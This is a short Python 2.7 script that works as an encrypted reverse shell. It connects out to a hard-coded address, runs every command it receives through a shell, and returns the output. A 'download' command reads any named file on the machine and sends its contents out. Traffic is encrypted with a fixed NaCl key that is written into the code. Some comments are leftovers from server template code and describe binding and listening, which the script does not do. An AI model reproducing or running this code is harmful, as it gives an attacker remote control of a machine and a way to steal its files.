#!/usr/bin/python2.7
import nacl.secret
import nacl.utils
import socket,subprocess
import sys,os,time

HOST = '192.168.1.11'   # Symbolic name, meaning all available interfaces
PORT = 8888 # Arbitrary non-privileged port

# This must be kept secret, this is the combination to your safe
key = '9SeT2kaxYlRYS675TxzHwB2el4Pa15A3'

# This is your safe, you can use it to encrypt or decrypt messages
box = nacl.secret.SecretBox(key)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print 'Socket created'

#Bind socket to local host and port
try:
    s.connect((HOST, PORT))
except socket.error as msg:
    print 'connect failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
    sys.exit()

print 'Socket connect complete'

#Start listening on socket
success = box.encrypt('Hello There!EOFEOFEOFEOFEOFX')
s.send(success)
#now keep talking with the client
while 1:

    data = s.recv(1024)
    dataDec =  box.decrypt(data)
    if dataDec == "quit":
            break
    elif dataDec.startswith("download") == True:
            #set the name of the file
            sendFile = dataDec[9:]
            #file transfer
            with open(sendFile, 'rb') as f:
                while 1:
                        fileData = f.read()
                        if fileData == '' : break
                        #send file
                        s.sendall(fileData)
            f.close()
            time.sleep(0.8)
            s.sendall('EOFEOFEOFEOFEOFX')
            time.sleep(0.8)
            s.sendall(box.encrypt('Download is finished'))

    else:



            proc = subprocess.Popen(dataDec, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdoutput = proc.stdout.read() + proc.stderr.read()
            stdoutputEnc = box.encrypt(stdoutput + 'EOFEOFEOFEOFEOFX')
            s.send(stdoutputEnc)

s.close()
